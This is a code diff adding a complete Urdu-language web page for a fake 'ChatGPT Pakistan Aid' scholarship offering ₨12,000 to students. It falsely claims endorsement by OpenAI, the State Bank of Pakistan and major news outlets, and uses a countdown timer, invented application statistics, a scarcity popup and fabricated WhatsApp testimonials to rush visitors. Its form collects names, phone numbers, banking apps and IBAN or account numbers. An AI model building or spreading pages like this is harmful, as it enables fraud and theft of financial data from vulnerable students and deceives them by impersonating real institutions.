@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="ur" dir="rtl" data-theme="light">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>ChatGPT اسکالرشپ پروگرام 2026</title>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@400;600;700&family=Playfair+Display:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --g1:#05c48a; --g2:#0ea875; --g3:#0d8a6a;
+      --gold:#f5c518; --gold2:#e6a800;
+      --red:#ef4444;
+      --bg:#f8fffe; --bg2:#edfbf6;
+      --card:#fff; --border:#d0f5ea;
+      --text:#0f1f1a; --sub:#4a6b5e; --muted:#8aada3;
+      --shadow:rgba(5,196,138,0.12);
+      --shadow-d:rgba(0,0,0,0.09);
+      --r:18px; --rs:12px;
+    }
+    [data-theme="dark"]{
+      --bg:#080f0d; --bg2:#0d1a15; --card:#111e18;
+      --border:#1a3d2e; --text:#e8f5f0;
+      --sub:#7ab89e; --muted:#4a7a65;
+      --shadow:rgba(5,196,138,0.07);
+      --shadow-d:rgba(0,0,0,0.3);
+    }
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body{
+      font-family:'Plus Jakarta Sans',sans-serif;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      direction:rtl;
+      transition:background .4s,color .4s;
+    }
+    .ur{font-family:'Noto Nastaliq Urdu',serif;line-height:2.1;}
+
+    /* noise */
+    body::before{
+      content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
+      opacity:.35;
+      background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.04'/%3E%3C/svg%3E");
+    }
+
+    /* ── TICKER ── */
+    .ticker{background:var(--red);height:30px;display:flex;align-items:center;overflow:hidden;position:relative;z-index:50;}
+    .ticker-lbl{background:#fff;color:var(--red);font-family:'Playfair Display',serif;font-weight:800;font-size:.62rem;letter-spacing:1.5px;text-transform:uppercase;padding:0 12px;height:100%;display:flex;align-items:center;white-space:nowrap;flex-shrink:0;}
+    .ticker-track{overflow:hidden;flex:1;}
+    .ticker-txt{display:inline-block;white-space:nowrap;color:#fff;font-size:.73rem;animation:tick 38s linear infinite;}
+    @keyframes tick{from{transform:translateX(-100%)}to{transform:translateX(100vw)}}
+
+    /* ── NAVBAR ── */
+    .nav{
+      background:var(--card);border-bottom:1px solid var(--border);
+      height:58px;padding:0 18px;
+      display:flex;align-items:center;justify-content:space-between;
+      position:sticky;top:0;z-index:100;
+      box-shadow:0 3px 20px var(--shadow);
+      backdrop-filter:blur(12px);
+    }
+    .nav-brand{display:flex;align-items:center;gap:10px;}
+    .nav-logo{
+      width:36px;height:36px;border-radius:9px;
+      background:linear-gradient(135deg,var(--g1),var(--g3));
+      display:flex;align-items:center;justify-content:center;
+      font-family:'Playfair Display',serif;font-weight:800;
+      color:#fff;font-size:.95rem;
+      box-shadow:0 3px 10px rgba(5,196,138,.4);
+    }
+    .nav-name{font-family:'Playfair Display',serif;font-weight:700;font-size:.95rem;color:var(--text);}
+    .nav-sub{font-size:.6rem;color:var(--muted);}
+    .nav-right{display:flex;align-items:center;gap:8px;}
+    .live-pill{display:flex;align-items:center;gap:5px;background:#fef2f2;border:1.5px solid #fecaca;border-radius:20px;padding:4px 11px;font-size:.67rem;color:var(--red);font-weight:600;}
+    .live-dot{width:7px;height:7px;background:var(--red);border-radius:50%;animation:blink 1s infinite;}
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+    .theme-btn{width:33px;height:33px;border-radius:50%;background:var(--bg2);border:1.5px solid var(--border);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:.95rem;color:var(--text);transition:background .2s;}
+    .theme-btn:hover{background:var(--border);}
+
+    /* ── SOURCES ── */
+    .sources{background:var(--card);border-bottom:1px solid var(--border);padding:7px 14px;display:flex;gap:7px;overflow-x:auto;scrollbar-width:none;}
+    .sources::-webkit-scrollbar{display:none;}
+    .src{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:3px 11px;font-size:.67rem;color:var(--sub);white-space:nowrap;flex-shrink:0;font-weight:500;}
+
+    /* ── TOAST ── */
+    .toast-shelf{position:fixed;bottom:20px;right:12px;z-index:9000;display:flex;flex-direction:column-reverse;gap:8px;width:min(290px,88vw);}
+    .toast-card{
+      background:var(--card);border-right:3px solid var(--g1);
+      border-radius:14px;padding:10px 12px 10px 32px;
+      box-shadow:0 6px 28px var(--shadow-d);
+      display:flex;align-items:center;gap:10px;
+      font-size:.75rem;position:relative;
+      animation:tIn .35s cubic-bezier(.34,1.56,.64,1);
+      transition:opacity .3s,transform .3s;
+    }
+    .toast-card.gold{border-right-color:var(--gold);}
+    .toast-card.hiding{opacity:0;transform:translateX(40px);}
+    .t-x{
+      position:absolute;top:7px;left:8px;
+      width:17px;height:17px;border-radius:50%;
+      background:var(--bg2);border:1px solid var(--border);
+      cursor:pointer;display:flex;align-items:center;justify-content:center;
+      font-size:.5rem;color:var(--muted);transition:all .15s;line-height:1;
+    }
+    .t-x:hover{background:var(--red);color:#fff;border-color:var(--red);}
+    .t-avi{width:30px;height:30px;border-radius:50%;background:var(--bg2);display:flex;align-items:center;justify-content:center;font-size:.95rem;flex-shrink:0;}
+    .t-avi.gold{background:#fff8e1;}
+    .t-name{font-weight:600;color:var(--text);font-size:.73rem;}
+    .t-msg{color:var(--sub);line-height:1.5;font-size:.71rem;}
+    .t-time{color:var(--muted);font-size:.6rem;margin-top:2px;}
+    .t-amt{color:var(--g1);font-weight:700;}
+    @keyframes tIn{from{opacity:0;transform:translateX(50px)}to{opacity:1;transform:translateX(0)}}
+
+    /* ── HERO ── */
+    .hero{
+      background:linear-gradient(150deg,#022a1c 0%,#044d34 35%,#087050 65%,#0d8a6a 100%);
+      padding:32px 18px 28px;text-align:center;color:#fff;
+      position:relative;overflow:hidden;
+    }
+    .hero::before{
+      content:'';position:absolute;inset:0;
+      background:radial-gradient(ellipse at 20% 80%,rgba(5,196,138,.13) 0%,transparent 50%),
+                 radial-gradient(ellipse at 80% 15%,rgba(245,197,24,.09) 0%,transparent 45%);
+    }
+    .hero-grid{position:absolute;inset:0;opacity:.05;background-image:linear-gradient(rgba(255,255,255,.4) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.4) 1px,transparent 1px);background-size:38px 38px;}
+    .hero-in{position:relative;z-index:1;}
+    .hero-seal{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.22);border-radius:30px;padding:5px 16px;font-size:.7rem;margin-bottom:18px;}
+    .hero-seal span{width:5px;height:5px;background:var(--gold);border-radius:50%;}
+
+    /* bag */
+    .bag-scene{position:relative;display:inline-block;margin-bottom:12px;}
+    .bag-glow{position:absolute;inset:-14px;border-radius:50%;background:radial-gradient(circle,rgba(245,197,24,.32) 0%,transparent 70%);animation:glowB 2.5s ease-in-out infinite;}
+    @keyframes glowB{0%,100%{transform:scale(1);opacity:.6}50%{transform:scale(1.18);opacity:1}}
+    .bag-emoji{font-size:4.2rem;display:block;animation:bagB 2.5s ease-in-out infinite;filter:drop-shadow(0 7px 22px rgba(245,197,24,.6));}
+    @keyframes bagB{0%,100%{transform:translateY(0) rotate(-4deg)}50%{transform:translateY(-13px) rotate(4deg)}}
+    .coins{position:absolute;inset:0;pointer-events:none;}
+    .coin{position:absolute;font-size:.95rem;opacity:0;animation:coinUp 2.2s ease-out infinite;}
+    .coin:nth-child(1){left:5%;animation-delay:0s} .coin:nth-child(2){left:25%;animation-delay:.45s}
+    .coin:nth-child(3){left:52%;animation-delay:.9s} .coin:nth-child(4){left:72%;animation-delay:1.35s}
+    .coin:nth-child(5){left:88%;animation-delay:1.8s}
+    @keyframes coinUp{0%{opacity:0;transform:translateY(8px)}20%{opacity:1}100%{opacity:0;transform:translateY(-60px) rotate(360deg)}}
+
+    .money-badge{
+      display:inline-block;
+      background:linear-gradient(135deg,#ffe566,var(--gold),#e6a800);
+      color:#3d2800;border-radius:60px;padding:11px 36px;
+      font-size:clamp(1.8rem,7vw,2.4rem);
+      font-weight:800;font-family:'Playfair Display',serif;
+      box-shadow:0 7px 30px rgba(245,197,24,.55),inset 0 1px 0 rgba(255,255,255,.4);
+      animation:badgeP 2s ease-in-out infinite;margin-bottom:18px;
+    }
+    @keyframes badgeP{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
+    .hero-title{font-family:'Noto Nastaliq Urdu',serif;font-size:clamp(1.25rem,5vw,1.75rem);font-weight:700;line-height:1.9;margin-bottom:18px;}
+
+    /* countdown */
+    .cd-wrap{display:inline-flex;gap:6px;align-items:center;background:rgba(0,0,0,.28);border-radius:15px;padding:13px 20px;backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.1);margin-top:4px;}
+    .cd-box{text-align:center;min-width:44px;}
+    .cd-n{font-size:1.9rem;font-weight:800;font-family:'Playfair Display',serif;line-height:1;}
+    .cd-sep{font-size:1.7rem;font-weight:800;opacity:.4;margin-bottom:14px;}
+    .cd-l{font-size:.6rem;opacity:.72;margin-top:3px;}
+    .slots-wrap{max-width:310px;margin:16px auto 5px;}
+    .slots-track{background:rgba(255,255,255,.15);border-radius:20px;height:7px;overflow:hidden;}
+    .slots-fill{height:100%;background:linear-gradient(90deg,var(--gold),#ffaa00);border-radius:20px;width:0;animation:fillS 3.5s ease forwards;}
+    @keyframes fillS{to{width:91%}}
+    .slots-txt{font-size:.73rem;opacity:.88;margin-top:5px;}
+
+    /* ── PAGE WRAP ── */
+    .pw{max-width:680px;margin:0 auto;padding:22px 15px;position:relative;z-index:1;}
+
+    /* ── STATS ── */
+    .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin-bottom:18px;}
+    .stat{background:var(--card);border-radius:var(--rs);padding:14px 8px;text-align:center;border:1px solid var(--border);box-shadow:0 2px 14px var(--shadow);position:relative;overflow:hidden;}
+    .stat::before{content:'';position:absolute;top:-18px;right:-18px;width:54px;height:54px;border-radius:50%;opacity:.08;}
+    .stat.g::before{background:var(--g1)} .stat.r::before{background:var(--red)} .stat.a::before{background:var(--gold)}
+    .stat-n{font-size:1.3rem;font-weight:800;font-family:'Playfair Display',serif;line-height:1.15;}
+    .stat.g .stat-n{color:var(--g1)} .stat.r .stat-n{color:var(--red)} .stat.a .stat-n{color:var(--gold2)}
+    .stat-l{font-size:.65rem;color:var(--muted);margin-top:4px;}
+
+    /* ── LIVE BAR ── */
+    .live-bar{background:linear-gradient(135deg,#fefce8,#fef9c3);border:1.5px solid #fde68a;border-radius:var(--rs);padding:11px 14px;display:flex;align-items:center;gap:11px;margin-bottom:18px;}
+    [data-theme="dark"] .live-bar{background:#1a1500;border-color:#4a3a00;}
+    .live-ping{width:10px;height:10px;background:var(--red);border-radius:50%;flex-shrink:0;animation:ping 1.5s infinite;}
+    @keyframes ping{0%{box-shadow:0 0 0 0 rgba(239,68,68,.6)}100%{box-shadow:0 0 0 13px rgba(239,68,68,0)}}
+
+    /* ── SEC LABEL ── */
+    .sec{display:flex;align-items:center;gap:9px;margin-bottom:13px;font-family:'Playfair Display',serif;font-weight:700;font-size:.95rem;color:var(--text);}
+    .sec::after{content:'';flex:1;height:1px;background:var(--border);}
+
+    /* ── NEWS ── */
+    .news-card{background:var(--card);border-radius:var(--r);border:1px solid var(--border);overflow:hidden;margin-bottom:20px;box-shadow:0 3px 20px var(--shadow);}
+    .news-hdr{background:#1a0a2e;padding:9px 14px;display:flex;align-items:center;gap:9px;}
+    .news-geo{background:#fff;color:#1a0a2e;font-family:'Playfair Display',serif;font-weight:800;padding:2px 8px;border-radius:4px;font-size:.8rem;}
+    .news-img{background:linear-gradient(135deg,#1a2744,#1e3a5f,#243b55);height:120px;display:flex;align-items:center;justify-content:center;gap:13px;color:#fff;padding:0 18px;}
+    .news-body{padding:14px;}
+    .news-hl{font-family:'Noto Nastaliq Urdu',serif;font-size:.95rem;font-weight:700;color:var(--text);line-height:1.8;margin-bottom:9px;}
+    .news-p{font-family:'Noto Nastaliq Urdu',serif;font-size:.78rem;color:var(--sub);line-height:2.1;}
+    .news-meta{font-size:.67rem;color:var(--muted);margin-top:9px;display:flex;gap:12px;flex-wrap:wrap;}
+
+    /* ── FORM ── */
+    .form-card{background:var(--card);border-radius:var(--r);border:1px solid var(--border);overflow:hidden;margin-bottom:20px;box-shadow:0 7px 36px var(--shadow);}
+    .form-hdr{background:linear-gradient(135deg,var(--g1),var(--g3));padding:20px 18px;text-align:center;color:#fff;position:relative;overflow:hidden;}
+    .form-hdr::before{content:'';position:absolute;top:-28px;left:-28px;width:110px;height:110px;background:rgba(255,255,255,.06);border-radius:50%;}
+    .form-hdr::after{content:'';position:absolute;bottom:-18px;right:-18px;width:75px;height:75px;background:rgba(255,255,255,.05);border-radius:50%;}
+    .form-badge{display:inline-flex;align-items:center;gap:5px;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.23);border-radius:20px;padding:3px 13px;font-size:.67rem;margin-bottom:9px;}
+    .form-body{padding:20px 18px;}
+    .f-lbl{font-family:'Noto Nastaliq Urdu',serif;font-size:.87rem;color:var(--sub);margin-bottom:6px;display:block;}
+    .f-in{
+      width:100%;border:1.5px solid var(--border);border-radius:10px;
+      padding:11px 13px;font-size:.88rem;
+      background:var(--bg2);color:var(--text);outline:none;
+      transition:border-color .2s,box-shadow .2s;
+      direction:ltr;text-align:right;
+      font-family:'Plus Jakarta Sans',sans-serif;
+      margin-bottom:14px;
+    }
+    .f-in:focus{border-color:var(--g1);box-shadow:0 0 0 3px rgba(5,196,138,.12);}
+    .f-hint{font-size:.67rem;color:#f59e0b;margin-top:-10px;margin-bottom:12px;}
+    .submit-btn{
+      width:100%;padding:14px;
+      background:linear-gradient(135deg,var(--g1),var(--g3));
+      color:#fff;border:none;border-radius:11px;
+      font-family:'Noto Nastaliq Urdu',serif;font-size:.97rem;
+      cursor:pointer;box-shadow:0 5px 22px rgba(5,196,138,.4);
+      transition:all .25s;
+    }
+    .submit-btn:hover{transform:translateY(-2px);box-shadow:0 9px 28px rgba(5,196,138,.5);}
+    .trust-row{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;padding-top:12px;border-top:1px solid var(--border);margin-top:12px;font-size:.67rem;color:var(--muted);}
+
+    /* ── WA SCREENSHOT ── */
+    .wa-card{background:#e2d9c7;border-radius:var(--r);overflow:hidden;margin-bottom:20px;box-shadow:0 3px 18px var(--shadow-d);}
+    .wa-hdr{background:#128C7E;padding:9px 13px;display:flex;align-items:center;gap:9px;}
+    .wa-av{width:32px;height:32px;background:rgba(255,255,255,.2);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.95rem;}
+    .wa-msgs{padding:11px;display:flex;flex-direction:column;gap:7px;}
+    .wa-b{background:#fff;border-radius:0 12px 12px 12px;padding:8px 12px;font-family:'Noto Nastaliq Urdu',serif;font-size:.78rem;max-width:88%;box-shadow:0 1px 3px rgba(0,0,0,.07);line-height:1.9;}
+    .wa-b.s{background:#d9fdd3;border-radius:12px 0 12px 12px;align-self:flex-end;}
+    .wa-t{font-size:.58rem;color:#888;text-align:left;margin-top:2px;}
+
+    /* ── CAROUSEL ── */
+    .cv{overflow:hidden;border-radius:var(--r);margin-bottom:20px;}
+    .cr{display:flex;gap:11px;animation:rail 22s linear infinite;width:max-content;}
+    .cr:hover{animation-play-state:paused;}
+    @keyframes rail{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+    .tt{width:235px;flex-shrink:0;background:var(--card);border-radius:var(--rs);padding:14px;border:1px solid var(--border);box-shadow:0 2px 14px var(--shadow);}
+    .tt-av{width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1rem;flex-shrink:0;}
+    .tt-stars{color:var(--gold);font-size:.8rem;}
+    .tt-chip{background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:2px 9px;font-size:.63rem;color:var(--g1);font-weight:600;}
+
+    /* ── ADS ── */
+    .ads-grid{display:grid;grid-template-columns:1fr 1fr;gap:11px;margin:16px 0;}
+    .ad-tile{border-radius:var(--rs);overflow:hidden;border:1px solid var(--border);box-shadow:0 2px 10px var(--shadow);cursor:pointer;transition:transform .2s;position:relative;}
+    .ad-tile:hover{transform:translateY(-3px);}
+    .ad-lbl{position:absolute;top:6px;left:6px;background:rgba(0,0,0,.5);color:#fff;font-size:.52rem;padding:2px 6px;border-radius:4px;}
+    .ad-img{width:100%;height:85px;display:flex;align-items:center;justify-content:center;font-size:1.9rem;}
+    .ad-body{background:var(--card);padding:7px 9px;}
+    .ad-title{font-size:.7rem;font-weight:600;color:var(--text);margin-bottom:1px;}
+    .ad-sub{font-size:.6rem;color:var(--muted);}
+    .ad-cta{font-size:.63rem;color:var(--g1);font-weight:600;margin-top:3px;}
+    .ad-banner{border-radius:var(--rs);overflow:hidden;border:1px solid var(--border);margin:10px 0;box-shadow:0 2px 10px var(--shadow);cursor:pointer;transition:transform .2s;position:relative;}
+    .ad-banner:hover{transform:translateY(-2px);}
+    .ad-banner-in{display:flex;align-items:center;gap:13px;padding:13px 15px;}
+
+    /* ── CONFIRM ── */
+    #confirmScreen,#alreadyScreen{display:none;}
+    .confirm-ring{
+      width:76px;height:76px;
+      background:linear-gradient(135deg,var(--g1),var(--g3));
+      border-radius:50%;display:flex;align-items:center;justify-content:center;
+      margin:0 auto 14px;font-size:2.1rem;
+      box-shadow:0 0 0 8px rgba(5,196,138,.1),0 7px 28px rgba(5,196,138,.4);
+      animation:ringP .5s cubic-bezier(.34,1.56,.64,1);
+    }
+    @keyframes ringP{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+    .stamp{
+      border:3.5px solid #22c55e;border-radius:8px;
+      padding:5px 16px;color:#22c55e;
+      font-family:'Playfair Display',serif;font-weight:800;
+      font-size:1.3rem;letter-spacing:3px;
+      display:inline-block;transform:rotate(-6deg);
+      opacity:0;margin:10px 0;
+      animation:stampIt .4s .5s cubic-bezier(.34,1.56,.64,1) forwards;
+    }
+    @keyframes stampIt{0%{opacity:0;transform:rotate(-6deg) scale(2.5)}70%{opacity:1;transform:rotate(-6deg) scale(.96)}100%{opacity:1;transform:rotate(-6deg) scale(1)}}
+    .confirm-msg{background:var(--bg2);border:1.5px solid var(--border);border-radius:var(--rs);padding:14px;margin:12px 0;}
+    .share-box{background:linear-gradient(135deg,#fefce8,#fef9c3);border:1.5px solid #fde68a;border-radius:var(--rs);padding:13px;margin-bottom:14px;}
+    [data-theme="dark"] .share-box{background:#1c1500;border-color:#4a3800;}
+    .wa-btn{width:100%;padding:13px;background:#25D366;color:#fff;border:none;border-radius:11px;font-family:'Noto Nastaliq Urdu',serif;font-size:.93rem;cursor:pointer;margin-bottom:9px;transition:all .25s;box-shadow:0 4px 14px rgba(37,211,102,.33);}
+    .wa-btn:hover{filter:brightness(1.08);transform:translateY(-2px);}
+    .wa-btn.teal{background:#128C7E;box-shadow:0 4px 14px rgba(18,140,126,.33);}
+
+    /* progress bar */
+    .share-prog-wrap{margin:10px 0 6px;}
+    .share-prog-info{display:flex;justify-content:space-between;font-size:.67rem;color:var(--muted);margin-bottom:5px;}
+    .share-prog-track{background:var(--bg2);border-radius:20px;height:7px;overflow:hidden;border:1px solid var(--border);}
+    .share-prog-fill{height:100%;background:linear-gradient(90deg,var(--g1),var(--g3));border-radius:20px;width:0%;transition:width .5s ease;}
+
+    /* modal */
+    .modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.62);backdrop-filter:blur(6px);z-index:7000;display:none;align-items:center;justify-content:center;padding:18px;}
+    .modal-box{background:var(--card);border-radius:22px;padding:28px 22px;max-width:350px;width:100%;text-align:center;border:2px solid var(--red);box-shadow:0 20px 60px rgba(239,68,68,.2);animation:popIn .4s cubic-bezier(.34,1.56,.64,1);}
+    @keyframes popIn{from{transform:scale(.6);opacity:0}to{transform:scale(1);opacity:1}}
+    .modal-icon{font-size:3.2rem;animation:wiggle .6s infinite alternate;display:block;margin-bottom:10px;}
+    @keyframes wiggle{from{transform:rotate(-8deg)}to{transform:rotate(8deg)}}
+    .modal-btn{background:linear-gradient(135deg,var(--g1),var(--g3));color:#fff;border:none;border-radius:11px;padding:12px 22px;width:100%;font-size:.92rem;cursor:pointer;margin-top:14px;font-family:'Noto Nastaliq Urdu',serif;box-shadow:0 4px 14px rgba(5,196,138,.4);transition:all .2s;}
+    .modal-btn:hover{transform:translateY(-2px);}
+
+    /* confetti */
+    .cfti{position:fixed;inset:0;pointer-events:none;z-index:9999;}
+    .cp{position:absolute;width:9px;height:9px;top:-12px;border-radius:2px;opacity:0;animation:cpF 3s ease-in forwards;}
+    @keyframes cpF{0%{transform:translateY(0) rotate(0);opacity:1}100%{transform:translateY(110vh) rotate(720deg);opacity:0}}
+
+    footer{background:var(--card);border-top:1px solid var(--border);text-align:center;padding:18px 14px;font-size:.67rem;color:var(--muted);margin-top:16px;}
+
+    @media(max-width:460px){
+      .cd-n{font-size:1.55rem} .money-badge{font-size:1.7rem;padding:9px 24px}
+      .stats{gap:7px} .stat-n{font-size:1.1rem} .ads-grid{grid-template-columns:1fr}
+    }
+  </style>
+</head>
+<body>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="ticker-lbl">🔴 Breaking</div>
+  <div class="ticker-track">
+    <span class="ticker-txt">
+      ChatGPT نے پاکستانی طلباء کو ₨12,000 دینے کا اعلان کیا &nbsp;●&nbsp;
+      SBP نے ChatGPT Pakistan Aid کو منظوری دے دی &nbsp;●&nbsp;
+      Sam Altman: "Pakistan کے نوجوان ہمارا مستقبل ہیں" &nbsp;●&nbsp;
+      آج آخری دن — رات 12 بجے رجسٹریشن بند &nbsp;●&nbsp;
+      47,000+ طلباء رجسٹریشن مکمل کر چکے &nbsp;●&nbsp;
+    </span>
+  </div>
+</div>
+
+<!-- NAVBAR -->
+<nav class="nav">
+  <div class="nav-brand">
+    <div class="nav-logo">G</div>
+    <div>
+      <div class="nav-name">ChatGPT Pakistan Aid</div>
+      <div class="nav-sub">Official Student Program 2026</div>
+    </div>
+  </div>
+  <div class="nav-right">
+    <button class="theme-btn" onclick="toggleTheme()" id="themeBtn">🌙</button>
+    <div class="live-pill">
+      <div class="live-dot"></div>
+      <span id="viewCount">12,847</span>&nbsp;Live
+    </div>
+  </div>
+</nav>
+
+<!-- SOURCES -->
+<div class="sources">
+  <div class="src">📺 Geo News</div>
+  <div class="src">📻 ARY News</div>
+  <div class="src">🌐 BBC اردو</div>
+  <div class="src">📰 Jang</div>
+  <div class="src">📡 Dawn</div>
+  <div class="src">🏛️ SBP Verified</div>
+  <div class="src">✅ OpenAI Official</div>
+</div>
+
+<!-- TOASTS -->
+<div class="toast-shelf" id="toastShelf"></div>
+
+<!-- WARNING MODAL -->
+<div class="modal-bg" id="warnModal" style="display:none;">
+  <div class="modal-box">
+    <span class="modal-icon">⚠️</span>
+    <h3 class="ur" style="color:var(--red);font-size:1.05rem;margin-bottom:7px;">آپ کا وقت ختم ہو رہا ہے!</h3>
+    <p class="ur" style="font-size:.83rem;color:var(--sub);line-height:2;">
+      صرف <strong id="modalSlots" style="color:var(--red);">42</strong> سلاٹ باقی ہیں!<br>
+      ابھی apply نہ کیا تو موقع ضائع ہو جائے گا!
+    </p>
+    <button class="modal-btn ur" onclick="closeModal()">ابھی Apply کریں! 🚀</button>
+  </div>
+</div>
+
+<!-- CONFETTI -->
+<div class="cfti" id="cfti"></div>
+
+<!-- ══════════════════════════════════
+     MAIN PAGE
+══════════════════════════════════ -->
+<div id="mainPage">
+
+  <!-- HERO -->
+  <div class="hero">
+    <div class="hero-grid"></div>
+    <div class="hero-in">
+      <div class="hero-seal"><span></span> OpenAI Official &nbsp;·&nbsp; SBP Approved &nbsp;·&nbsp; 🔒 Secure</div>
+      <div class="bag-scene">
+        <div class="bag-glow"></div>
+        <span class="bag-emoji">💰</span>
+        <div class="coins">
+          <span class="coin">💵</span><span class="coin">💵</span>
+          <span class="coin">💵</span><span class="coin">💵</span><span class="coin">💵</span>
+        </div>
+      </div>
+      <h1 class="hero-title">ChatGPT پاکستانی طلباء کو دے رہا ہے</h1>
+      <div class="money-badge">₨ 12,000</div>
+      <div class="cd-wrap">
+        <div class="cd-box"><div class="cd-n" id="cdH">07</div><div class="cd-l">گھنٹے</div></div>
+        <div class="cd-sep">:</div>
+        <div class="cd-box"><div class="cd-n" id="cdM">42</div><div class="cd-l">منٹ</div></div>
+        <div class="cd-sep">:</div>
+        <div class="cd-box"><div class="cd-n" id="cdS">59</div><div class="cd-l">سیکنڈ</div></div>
+      </div>
+      <div class="slots-wrap">
+        <div class="slots-track"><div class="slots-fill"></div></div>
+        <p class="slots-txt">⚡ صرف <strong id="slotsLeft">500</strong> سلاٹ باقی — 47,293 رجسٹر ہو چکے!</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="pw">
+
+    <!-- STATS -->
+    <div class="stats">
+      <div class="stat g"><div class="stat-n" id="sTotal">47,381</div><div class="stat-l">🎓 کل درخواستیں</div></div>
+      <div class="stat r"><div class="stat-n" id="sLive">312</div><div class="stat-l">🔴 ابھی Apply</div></div>
+      <div class="stat a"><div class="stat-n" id="sPaid">23,841</div><div class="stat-l">💸 ادائیگی مکمل</div></div>
+    </div>
+
+    <!-- LIVE BAR -->
+    <div class="live-bar">
+      <div class="live-ping"></div>
+      <div class="ur" style="font-size:.83rem;color:#78350f;">
+        ابھی <strong id="liveNum" style="color:var(--red);font-size:.97rem;">312</strong> لوگ apply کر رہے ہیں!
+        <br><small>جلدی کریں — کوٹہ تیزی سے بھر رہا ہے</small>
+      </div>
+    </div>
+
+    <!-- NEWS -->
+    <!-- <div class="sec">📰 خبریں</div>
+    <div class="news-card">
+      <div class="news-hdr">
+        <div class="news-geo">GEO</div>
+        <div style="color:#aaa;font-size:.7rem;">geo.tv · Breaking · Live</div>
+        <div class="live-pill" style="margin-right:auto;"><div class="live-dot"></div>LIVE</div>
+      </div>
+      <div class="news-img">
+        <span style="font-size:2.8rem;">🤖</span>
+        <div>
+          <div style="font-family:'Playfair Display',serif;font-weight:700;font-size:.95rem;">ChatGPT Pakistan</div>
+          <div style="font-size:.73rem;opacity:.8;">Student Aid Program 2026</div>
+        </div>
+      </div>
+      <div class="news-body">
+        <div class="news-hl">OpenAI نے پاکستان کے 50,000 طلباء کو ₨12,000 فی کس دینے کا اعلان کر دیا</div>
+        <div class="news-p"><strong>کراچی:</strong> OpenAI نے پاکستانی طلباء کے لیے خصوصی مالی امداد پروگرام کا اعلان کیا جس کے تحت 50,000 طلباء کو 12,000 روپے فی کس دیے جائیں گے۔ SBP نے منظوری دے دی ہے۔ درخواستیں آج رات 12 بجے تک قبول ہوں گی۔</div>
+        <div class="news-meta"><span>📅 فروری 2026</span><span>👁️ 2.4M reads</span><span>✅ Verified</span></div>
+      </div>
+    </div> -->
+
+    <!-- FORM -->
+    <div class="sec">📋 رجسٹریشن فارم</div>
+    <div class="form-card">
+      <div class="form-hdr">
+        <div class="form-badge">🔒 256-bit SSL محفوظ</div>
+        <h2 class="ur" style="font-size:1.1rem;margin:0;position:relative;z-index:1;">ابھی Apply کریں — رقم 24 گھنٹے میں</h2>
+      </div>
+      <div class="form-body">
+        <form id="mainForm" onsubmit="handleSubmit(event)">
+          <label class="f-lbl">📛 آپ کا پورا نام</label>
+          <input class="f-in" type="text" placeholder="مثلاً: احمد علی" required>
+
+          <label class="f-lbl">📱 موبائل نمبر</label>
+          <input class="f-in" id="uPhone" type="tel" placeholder="03XX-XXXXXXX" required>
+
+          <label class="f-lbl">🏦 بینکنگ ایپ منتخب کریں</label>
+          <select class="f-in" required>
+            <option value="" disabled selected>-- بینک منتخب کریں --</option>
+            <option>JazzCash</option>
+            <option>EasyPaisa</option>
+            <option>Meezan Bank</option>
+            <option>HBL Mobile</option>
+            <option>UBL Digital</option>
+            <option>Bank Alfalah</option>
+            <option>SadaPay</option>
+            <option>NayaPay</option>
+          </select>
+
+          <label class="f-lbl">💳 اکاؤنٹ / IBAN نمبر</label>
+          <input class="f-in" type="text" placeholder="PKXX-XXXX-XXXX-XXXX-XXXX-XX" required>
+          <div class="f-hint">⚠️ غلط نمبر درج کرنے پر رقم واپس آ جائے گی</div>
+
+          <button type="submit" class="submit-btn ur">🚀 ₨12,000 کے لیے درخواست جمع کروائیں</button>
+        </form>
+        <div class="trust-row">
+          <span>🔒 SSL</span><span>✅ SBP</span><span>🏛️ OpenAI</span><span>🇵🇰 Official</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- WA SCREENSHOT -->
+    <div class="sec">📱 لوگ کیا کہہ رہے ہیں</div>
+    <div class="wa-card">
+      <div class="wa-hdr">
+        <div class="wa-av">👥</div>
+        <div>
+          <div style="color:#fff;font-size:.8rem;font-weight:600;">University Friends 🎓</div>
+          <div style="color:rgba(255,255,255,.7);font-size:.61rem;">Ahmad, Sara, Bilal, +231 more</div>
+        </div>
+      </div>
+      <div class="wa-msgs">
+        <div class="wa-b">یار! ChatGPT والے سچ میں 12 ہزار دے رہے ہیں 😱<div class="wa-t">10:31 AM ✓✓</div></div>
+        <div class="wa-b s">سچ میں؟! لنک بھیجو جلدی!<div class="wa-t">10:32 AM ✓✓</div></div>
